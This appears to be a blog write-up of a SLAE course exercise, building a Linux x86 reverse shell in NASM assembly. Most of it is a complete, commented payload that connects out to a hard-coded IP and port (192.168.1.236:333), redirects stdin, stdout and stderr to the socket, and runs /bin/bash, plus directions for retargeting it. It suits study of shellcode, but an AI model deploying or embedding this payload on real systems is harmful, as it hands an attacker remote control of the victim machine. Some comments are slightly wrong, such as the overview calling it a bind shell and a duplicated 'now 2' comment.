---
layout: post
title: SLAE Exercise 2 - Reverse Shell
subtitle: Linux x86 Reverse Shell
tags: [SLAE]
---

**Overview**
The second task of the SLAE exam required a bind shell to be written. The requirements for this were as follows:

- Reverse connects to configured IP and Port
- Execs shell on succesful connection
- IP and Port should be easily configurable

**Requirements**

To determine the requirements for this exercise it needs to be understood what a reverse shell is. 

*What is a reverse shell?* 
A reverse shell connects back to the listening attacker's system, presenting that connection with a shell to the target system. 

*So what is needed from a reverse shell?* 
As per the requirements, it needs to reverse connect to a configured IP address and port and execute a shell on a successful connection. 

Due to the similarities between this and a bind shell, no higher level code will need to be analysed to determine what to do. The main difference between the two shells is that with a bind shell the system is awaiting an inbound connection and with a reverse shell the system is actively connecting outbound. Let's take a look at the socket calls that were used for the bind shell:

- Socket
- Bind
- Listen
- Accept
	
As can be seen here, for the bind shell a socket was created, it was bound to a port then set to listen for an incoming connection and will ultimately accept that connection. For a reverse shell the socket doesn't need to do any of the socketcall syscalls after creating the socket, instead it needs to use the 'connect' socketcall to connect outbound to  the waiting attackers machine. Based on this, the syscalls that are required for the reverse shell will be:

- socket (socketcall) - to create a socket
- connect (socketcall) - to use the previously created socket to connect outbound
- dup2 - To duplicate file descriptors allowing the connection to effectively be 'piped'
- execve - To execute /bin/bash, presenting it to the socket connection

The majority of this shellcode has been heavily explained within exercise 1. The exception being the connect socketcall. From the man pages for connect - 'man 2 connect', the structure required can be seen as below:

```
	int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
```

Therefore values have to be pushed to the stack to satisfy these requirements to be placed into ecx. What is needed it:

1. The File Descriptor returned from the socket (edx)
2. The sockaddr structure, found in 'man 7 ip'
3. The addrlen, which will use the stack pointer

Based on the code written for the reverse shell [here](https://github.com/14Deep/SLAE/tree/master/Exercise%202), the stack has been visualised which should clear up what will be where on the stack when the pointer is pushed to ecx. The stack would appear as below:

	Addr	Value	  Description
  
	0x6	  Edx	    FD from socketcall
	0x5	  *0x3	  Pointer to location 0x3
	0x4	  0x10	  Addrlen set to 16 bytes
	0x3	  0x2	    2 for IF_INET
	0x2	  0x4d01	The port required (333)
	0x1	  0xec01	IP address
	0x0	  0xa8c0	IP address

The code that has been written can be seen below:

```
; Filename: reverse.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Reverse shell shellcode for Linux x86 for the SLAE course


global _start			

section .text
_start:

    	;Clearing the registers
    	xor eax, eax
    	xor ebx, ebx
	    xor ecx, ecx
    	xor edx, edx
    	xor esi, esi

	    ;Socket Calls
        ;In reverse order, pushing each value to the stack:

	    ;Socket - creating the socket
	    push eax     ; Pushing 0 for the Protocol parameter required
    	push 0x1     ; Pushing 1 for the Type (SOCK_STREAM) parameter required
	    push 0x2     ; Pushing 2 for the Domain (IF_INET) parameter required
	
	    mov al, 0x66 ; Adding syscall for socketcall() to eax
	    mov bl, 0x1  ; 0x1 is added to bx for the socketcall parameter 'socket'

	    	     ; At this point, eax is set to 0x66 for the socketcall
		     ; syscall, ebx is set to 0x1 for the socket parameter
		     ; and ecx will contain the values that were pushed to 
		     ; the stack. 

	     mov ecx, esp ; Moving the pointer to the stack into ecx for the final parameters

    	int 0x80     ; Interupt to call the syscall
	    mov edx, eax ; Moving the File Descriptor return value to edx


    	;Connect - Connect outbound
    	mov al, 0x66 ; For Socketcall
    	mov bl, 0x3  ; For Connect
    
    	;need to push values to the stack to satisfy the following:
    	;int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
    	; What is needed is:
    	; 1. The File Descriptor returned from the socket (edx)
    	; 2. The sockaddr structure, found in 'man 7 ip'
    	; 3. The addrlen, this will use the stack pointer

    	;What the stack would be like:
    	;
	    ;0x6 edx	-FD from socket call
    	;0x5 *0x3	-Pointer to 0x3
    	;0x4 0x10	-addrlen set to 16 bytes
	    ;0x3 0x02	-2 IF_INET
	    ;0x2 0x4d01	-The port (333)
	    ;0x1 0xec01	-IP address dword
	    ;0x0 0xa8c0	-IP address dword
	    ;
	    ;ecx contains pointer to the struct -- 0x3
	    ;ecx contains 0x6


      	;sockaddr structure
	      ;           struct sockaddr_in {
        ;      sa_family_t    sin_family; /* address family: AF_INET */
        ;      in_port_t      sin_port;   /* port in network byte order */
        ;       struct in_addr sin_addr;   /* internet address */
        ;   };



	    push dword 0xec01a8c0 ; Bytes in reverse order (endianness) c0(192).a8(168).01(1).ec(236)
	    push word 0x4d01      ; The port to use, in this case 333 - 0x014d
	    push word 0x2	      ; Always 2 for IF_INET
	
	    ;addrlen
	    mov ecx, esp ; Moving the stack pointer to ecx to point to sockaddr structure dynamically
	    push 0x10    ; Push addrlen to the stack, of the structure below. This is 16 bytes


	    push ecx     ; The stack pointer which is pointing to the sockaddr struct pushed earlier
    	push edx     ; File Descriptor from socket call to satisfy (1.)
	
	    mov ecx, esp ; The previous value of ecx was pushed to the stack a few instructions before, this updates
		               ; ecx with the current stack pointer to the values previously pushed to the stack. 

	    int 0x80     ; Interupt to call the syscall



    	;dup2 - duplicate the file descriptor to redirect the incoming connection 
	    ;Note - this could be looped if required

	    mov al, 0x3f  ; Syscall for dup2
	    mov ebx, edx  ; Moving the old FD into ebx
	    mov ecx, esi  ; Moving 0 into ecx for 'stdin'
	    int 0x80      ; Interupt to call the syscall

	    mov al, 0x3f
   	  inc ecx       ; Increment ecx so it is now 2
    	int 0x80      ; Interupt to call the syscall

   	  mov al, 0x3f
    	inc ecx       ; Increment ecx so it is now 2
    	int 0x80      ; Interupt to call the syscall
	


   	;execve - execute '/bin/bash' to provide a shell

    	xor eax, eax  ; Clearing eax
    	push eax      ; Pushing 0 to the stack

   	; push////bin/bash (12), could be shortened to //bin/sh (8)
    	push 0x68736162
   	  push 0x2f6e6962
    	push 0x2f2f2f2f

    	mov ebx, esp ; Move stack pointer pointing to the above to ebx as a parameter (filename)
	
	    xor ecx, ecx ; Null pointer for ecx argv
	    xor edx, edx ; Null pointer for edx envp

    	mov al, 0xb   ; Moving 11 to eax for execve syscall
    	int 0x80      ; Interupt to call the syscall
```

The following should be changed in order to change the IP address connected to and the port:
```
	Push dword 0xec01a8c0
	Push word 0x4d01
```



